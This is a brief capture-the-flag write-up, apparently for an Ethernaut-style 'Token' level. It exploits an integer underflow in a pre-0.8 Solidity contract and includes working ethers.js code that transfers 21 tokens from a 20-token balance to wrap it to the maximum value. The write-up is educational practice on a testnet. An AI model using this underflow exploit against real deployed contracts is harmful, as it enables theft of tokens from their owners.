### Goals

We need to acquire huge amount of tokens

### Exploit

First things that catched my eye is solidity version, prior to 0.8 we need to be careful with overflow/underflows. That is what we will exploit here.

Since we have 20 tokens we will transfer 21 to anyone, thus overflowing our balance to `type(uint256).max`. The require check will evaluate to true since the balance would overflow and we would have enough tokens for the transfer.

### Code

As in CoinFlip we can use some JS code:

```code
import { ethers } from "ethers";

let provider = new ethers.JsonRpcProvider(
  "https://ethereum-sepolia.publicnode.com"
);

const signer = new ethers.Wallet(
  "YOUR_PRV_KET",
  provider
);

const token = new ethers.Contract(
  "TOKEN_ADDRESS",
  ["function transfer(address, uint256) external"],
  signer
);
let tx = await token.transfer(token.target, 21, { gasLimit: 100_000 });
await tx.wait();
console.log(`tx: ${tx.hash}`);
```

Done!
